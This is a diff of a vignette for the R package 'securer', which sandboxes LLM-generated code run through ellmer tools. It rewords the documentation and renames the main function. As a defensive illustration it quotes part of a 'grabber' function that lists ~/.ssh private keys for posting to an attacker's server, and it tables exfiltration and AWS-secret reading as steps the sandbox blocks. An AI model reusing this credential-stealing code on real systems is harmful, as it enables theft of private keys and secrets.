@@ -16,15 +16,13 @@ knitr::opts_chunk$set(
 can_eval <- requireNamespace("securer", quietly = TRUE)
 ```
 
-## Overview
+## What this is for
 
-[ellmer](https://ellmer.tidyverse.org/) is an R package for chatting with LLMs.
-securer integrates with ellmer's tool-use system so an LLM can execute R code in
-a sandboxed child process. The LLM writes code, securer runs it safely, and the
-result flows back into the conversation.
-
-`securer_as_ellmer_tool()` connects the two packages. It wraps a
-`SecureSession` as an ellmer tool definition that you register on a chat object.
+[ellmer](https://ellmer.tidyverse.org/) is an R package for chatting with
+LLMs, and it lets the model call tools. `as_ellmer_tool()` turns a
+`SecureSession` into one of those tools. Register it on a chat, and the
+model can write R code, have securer run it in the sandbox, and read the
+result.
 
 ## Quick start
 
@@ -33,25 +31,25 @@ library(securer)
 library(ellmer)
 
 chat <- chat_openai()
-chat$register_tool(securer_as_ellmer_tool())
+chat$register_tool(as_ellmer_tool())
 chat$chat("What is the sum of the first 100 prime numbers?")
 ```
 
-The LLM receives a tool called `execute_r_code` that accepts a
-`code` string. When the model decides to use it, securer runs the code in a
-sandboxed child process and returns the result. The sandbox blocks filesystem
-writes and network access. The LLM can compute but not exfiltrate.
+The model sees a tool called `execute_r_code` that takes one argument,
+`code`. When the model calls it, securer runs the code in the sandbox and
+sends back the result. The code can compute whatever it likes, but it can't
+write to your files or send anything over the network.
 
-## Why securer? A real supply chain attack
+## Why bother: an example attack
 
-Without a sandbox, LLM-generated code runs with your full permissions. The
-[showittome](https://github.com/ian-flores/showittome) package demonstrates
-the risk: it scans `~/.ssh` for private keys and POSTs them to an
-attacker-controlled server.
+Without a sandbox, code the model writes runs with all of your permissions.
+The [showittome](https://github.com/ian-flores/showittome) package shows
+what that can mean. It looks in `~/.ssh` for private keys and posts them to
+a server the attacker controls.
 
 ```{r}
 # From https://github.com/ian-flores/showittome/blob/master/R_pkg/R/grabber.R
-# DO NOT RUN --- this is the attack we're defending against
+# DO NOT RUN: this is the attack
 grabber <- function() {
   ssh_files <- list.files(path = "~/.ssh")
   for (file in ssh_files) {
@@ -73,7 +71,7 @@ grabber <- function() {
 }
 ```
 
-With securer, every step of this attack fails:
+In a securer session, each step fails:
 
 ```{r}
 session <- SecureSession$new(sandbox = TRUE)
@@ -104,21 +102,22 @@ session$close()
 | `httr::POST(...)` | Data exfiltrated | Network denied |
 | `Sys.getenv("AWS_SECRET_ACCESS_KEY")` | Key value returned | Empty (env sanitized) |
 
-These are independent defense layers. See `vignette("security-model")` for the full threat model.
+Each step is stopped by a different restriction, so one gap doesn't undo the
+rest. `vignette("security-model")` has the details.
 
 ## How it works
 
-`securer_as_ellmer_tool()` creates a `SecureSession` (or uses one you provide)
-and returns an ellmer `ToolDef` with a single `code` argument. When the LLM
-invokes it, securer sends the code to the sandboxed child, gets the result, and
-returns it as a string. Errors are returned as `ContentToolResult(error = ...)`
-so the LLM can react without crashing the chat loop.
+`as_ellmer_tool()` starts a `SecureSession`, or uses one you pass in, and
+returns an ellmer `ToolDef` with a single `code` argument. When the model
+calls it, securer runs the code in the session and returns the result as a
+string. If something goes wrong, the error goes back to the model as
+`ContentToolResult(error = ...)`, so the chat keeps going.
 
-See `vignette("deployment")` for the full architecture diagram.
+There's a diagram of the whole round trip in `vignette("deployment")`.
 
 ## Adding securer tools
 
-You can expose your own functions to the LLM as securer tools:
+You can also give the model's code your own functions, as securer tools:
 
 ```{r}
 tools <- list(
@@ -126,9 +125,8 @@ tools <- list(
     fn = function(table, limit) {
       con <- DBI::dbConnect(RSQLite::SQLite(), "data.db")
       on.exit(DBI::dbDisconnect(con))
-      # Allowlist table names to prevent SQL injection -- the LLM
-      # controls the `table` argument, so it must never be interpolated
-      # directly into SQL.
+      # The LLM controls `table`, so check it against the real table
+      # names and never paste it into SQL as is.
       allowed <- DBI::dbListTables(con)
       if (!table %in% allowed) stop("Unknown table: ", table)
       DBI::dbGetQuery(
@@ -149,20 +147,21 @@ tools <- list(
 )
 
 chat <- chat_openai()
-chat$register_tool(securer_as_ellmer_tool(tools = tools))
+chat$register_tool(as_ellmer_tool(tools = tools))
 chat$chat("What tables are available? Show me the first 5 rows of each.")
 ```
 
-The LLM's code runs sandboxed, but `query_db()` and `list_tables()` execute on
-the host with full database access. The sandbox ensures the LLM can only interact
-with your data through the tools you define.
+The model's code runs in the sandbox, but `query_db()` and `list_tables()`
+run in your session, with full access to the database. So the model can
+reach your data, but only through the functions you wrote.
 
 ## Configuring the session
 
-`securer_as_ellmer_tool()` accepts the same options as `SecureSession`:
+`as_ellmer_tool()` takes `tools`, `sandbox`, and `limits`, which it passes to
+the session it creates, and a `timeout` for each call:
 
 ```{r}
-tool_def <- securer_as_ellmer_tool(
+tool_def <- as_ellmer_tool(
   tools = tools,
   sandbox = TRUE,
   limits = list(cpu = 30, memory = 512 * 1024 * 1024),
@@ -170,13 +169,12 @@ tool_def <- securer_as_ellmer_tool(
 )
 ```
 
-See `vignette("deployment")` for details on sandbox modes, resource limits,
-and timeouts.
+`vignette("deployment")` explains the sandbox and the resource limits.
 
 ## Using a pre-existing session
 
-If you need more control over the session lifecycle, create one yourself and
-pass it in:
+For other session options, or to control when the session starts and
+stops, create the session yourself and pass it in:
 
 ```{r}
 session <- SecureSession$new(
@@ -186,30 +184,33 @@ session <- SecureSession$new(
 )
 
 chat <- chat_openai()
-chat$register_tool(securer_as_ellmer_tool(session = session))
+chat$register_tool(as_ellmer_tool(session = session))
 
 chat$chat("Analyze the sales table and compute monthly totals.")
 chat$chat("Now plot the trend.")  # Same session, state persists
 
-# You own the session --- close it when done
+# It's your session, so close it when you're done
 session$close()
 ```
 
-When you provide your own session, securer does not create or close one
-internally. This gives you control over verbose/audit logging, state
-persistence across chat turns, and session reuse across chat objects.
+When you pass a session, `as_ellmer_tool()` ignores `tools`, `sandbox`, and
+`limits`, and never closes the session for you. That lets you turn on
+verbose output or an audit log, and share one session between chats.
 
 ## Result formatting
 
-securer converts R values to strings before returning them to the LLM.
-Data frames are truncated at 30 rows, other output at 50 lines. This prevents
-large results from consuming the LLM's context window.
+securer turns the result into text before the model sees it. A data frame
+is cut to its first 30 printed lines, with a note giving the total number
+of rows. Anything else is cut at 50 lines. Big results would otherwise fill
+up the model's context.
 
 ## Error handling
 
-Errors (syntax, runtime, timeout, dead session, type mismatches) are returned
-to the LLM as `ContentToolResult(error = ...)` rather than R exceptions. The
-chat loop continues and the LLM can retry or explain the error.
+Syntax errors, runtime errors, timeouts, a dead session, and tool arguments
+of the wrong type all go back to the model as `ContentToolResult(error = ...)`
+instead of stopping your R code. The model can then fix its code and try
+again, or explain what went wrong. The error text has file paths and similar
+details removed first.
 
 ## Example: data analysis assistant
 
@@ -241,7 +242,7 @@ chat <- chat_openai(
     "Available R tools: load_csv(path), save_plot(filename)."
   )
 )
-chat$register_tool(securer_as_ellmer_tool(
+chat$register_tool(as_ellmer_tool(
   tools = tools,
   timeout = 60,
   limits = list(memory = 1024 * 1024 * 1024)
@@ -253,33 +254,32 @@ chat$chat("What's the correlation between price and quantity?")
 chat$chat("Create a scatter plot of price vs quantity")
 ```
 
-## Using with other LLM providers
+## Other providers
 
-The tool definition is provider-agnostic. Any ellmer backend with tool-use
-support works:
+The tool works with any ellmer provider that supports tool calls:
 
 ```{r}
 chat <- chat_anthropic()
-chat$register_tool(securer_as_ellmer_tool())
+chat$register_tool(as_ellmer_tool())
 
 chat <- chat_ollama(model = "llama3")
-chat$register_tool(securer_as_ellmer_tool())
+chat$register_tool(as_ellmer_tool())
 ```
 
-## Session pooling
+## Many users at once
 
-For concurrent users, use `SecureSessionPool` for raw code execution or
-per-request sessions for ellmer chats:
+If you run code directly, a `SecureSessionPool` hands out sessions for you.
+For ellmer chats, give each request its own tool and session:
 
 ```{r}
-# Raw code execution: pool handles acquire/release
+# Running code directly: the pool hands out and takes back sessions
 pool <- SecureSessionPool$new(size = 4, tools = tools, sandbox = TRUE)
 handle_user_code <- function(code) pool$execute(code, timeout = 30)
 
-# ellmer chats: one session per request, cleaned up on GC
+# ellmer chats: one session per request, closed when garbage collected
 handle_user_chat <- function(user_message) {
   chat <- chat_openai()
-  chat$register_tool(securer_as_ellmer_tool(tools = tools, timeout = 30))
+  chat$register_tool(as_ellmer_tool(tools = tools, timeout = 30))
   chat$chat(user_message)
 }
 ```
